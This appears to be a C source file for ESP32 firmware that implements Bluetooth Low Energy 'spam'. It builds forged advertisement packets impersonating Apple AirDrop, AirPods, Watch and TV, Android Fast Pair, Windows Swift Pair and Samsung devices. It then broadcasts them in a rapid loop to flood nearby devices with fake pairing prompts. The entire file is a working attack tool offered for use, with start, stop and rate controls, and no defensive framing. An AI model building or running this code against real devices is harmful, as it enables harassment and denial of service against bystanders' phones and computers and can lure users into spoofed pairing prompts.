#include "ble_engine.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "string.h"

static const char *TAG = "BLESPAM";

static TaskHandle_t s_spam_task = NULL;
static volatile bool s_spam_running = false;
static ble_spam_type_t s_spam_type = BLE_SPAM_NONE;
static uint32_t s_spam_rate_ms = 100;

static uint8_t s_adv_buf[64];
static int s_adv_len = 0;

static void build_airdrop(uint8_t *buf, int *len)
{
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    *len = 0;
    buf[(*len)++] = 0x1E;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x4C;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x05;
    memcpy(buf + *len, mac, 6); *len += 6;
    for (int i = 0; i < 22; i++) buf[(*len)++] = esp_random() & 0xFF;
}

static void build_airpods(uint8_t *buf, int *len)
{
    *len = 0;
    buf[(*len)++] = 1 + 25;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x4C;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x07;
    buf[(*len)++] = 0x19;
    for (int i = 0; i < 21; i++) buf[(*len)++] = esp_random() & 0xFF;
}

static void build_apple_watch(uint8_t *buf, int *len)
{
    *len = 0;
    buf[(*len)++] = 1 + 27;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x4C;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x0C;
    for (int i = 0; i < 24; i++) buf[(*len)++] = esp_random() & 0xFF;
}

static void build_apple_tv(uint8_t *buf, int *len)
{
    *len = 0;
    buf[(*len)++] = 1 + 19;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x4C;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x0E;
    for (int i = 0; i < 16; i++) buf[(*len)++] = esp_random() & 0xFF;
}

static void build_android_fastpair(uint8_t *buf, int *len)
{
    uint16_t model_ids[] = {0x01C4, 0x01A0, 0x01D8, 0x01E0, 0x01E8};
    uint16_t model = model_ids[esp_random() % 5];

    *len = 0;
    buf[(*len)++] = 1 + 6;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0xE0;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x02;
    buf[(*len)++] = 0x01;
    buf[(*len)++] = model & 0xFF;
    buf[(*len)++] = (model >> 8) & 0xFF;
}

static void build_windows_swiftpair(uint8_t *buf, int *len)
{
    *len = 0;
    buf[(*len)++] = 1 + 9;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x06;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x03;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = esp_random() & 0xFF;
    buf[(*len)++] = esp_random() & 0xFF;
    buf[(*len)++] = esp_random() & 0xFF;
    buf[(*len)++] = 0x00;
}

static void build_samsung(uint8_t *buf, int *len)
{
    *len = 0;
    buf[(*len)++] = 1 + 10;
    buf[(*len)++] = 0xFF;
    buf[(*len)++] = 0x75;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x01;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x0B;
    buf[(*len)++] = 0x00;
    buf[(*len)++] = esp_random() & 0xFF;
    buf[(*len)++] = esp_random() & 0xFF;
    buf[(*len)++] = esp_random() & 0xFF;
}

typedef void (*spam_builder_t)(uint8_t *buf, int *len);

static const spam_builder_t s_builders[] = {
    build_airdrop, build_airpods, build_apple_watch,
    build_apple_tv, build_android_fastpair,
    build_windows_swiftpair, build_samsung
};

static const ble_spam_type_t s_builder_types[] = {
    BLE_SPAM_AIRDROP, BLE_SPAM_AIRPODS, BLE_SPAM_APPLE_WATCH,
    BLE_SPAM_APPLE_TV, BLE_SPAM_ANDROID_FASTPAIR,
    BLE_SPAM_WINDOWS_SWIFTPAIR, BLE_SPAM_SAMSUNG
};

static void adv_stop_cb(int rc, void *arg)
{
    (void)rc;
    (void)arg;
}

static void spam_task(void *arg)
{
    ESP_LOGI(TAG, "BLE spam started (type: %d, rate: %lu ms)", s_spam_type, s_spam_rate_ms);

    uint8_t own_addr_type;
    ble_hs_id_infer_auto(0, &own_addr_type);

    while (s_spam_running) {
        for (int i = 0; i < 7 && s_spam_running; i++) {
            ble_spam_type_t bt = s_builder_types[i];
            if (s_spam_type != BLE_SPAM_ALL && s_spam_type != bt) continue;

            s_builders[i](s_adv_buf, &s_adv_len);

            struct ble_hs_adv_fields ad = {
                .flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP,
                .mfg_data = s_adv_buf,
                .mfg_data_len = s_adv_len,
            };

            ble_gap_adv_set_data(&ad);
            ble_gap_adv_start(own_addr_type, NULL, 100, NULL, adv_stop_cb, NULL);
            vTaskDelay(pdMS_TO_TICKS(s_spam_rate_ms / 7));
            ble_gap_adv_stop();
        }
    }

    ESP_LOGI(TAG, "BLE spam stopped");
    s_spam_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t ble_spam_start(ble_spam_type_t type, uint32_t rate_ms)
{
    if (s_spam_running) ble_spam_stop();

    s_spam_type = type;
    s_spam_rate_ms = rate_ms > 0 ? rate_ms : 100;
    s_spam_running = true;

    xTaskCreatePinnedToCore(spam_task, "ble_spam", 4096, NULL, 5,
                            &s_spam_task, 0);
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    s_spam_running = false;
    ble_gap_adv_stop();
    if (s_spam_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        s_spam_task = NULL;
    }
    return ESP_OK;
}

bool ble_spam_is_active(void) { return s_spam_running; }
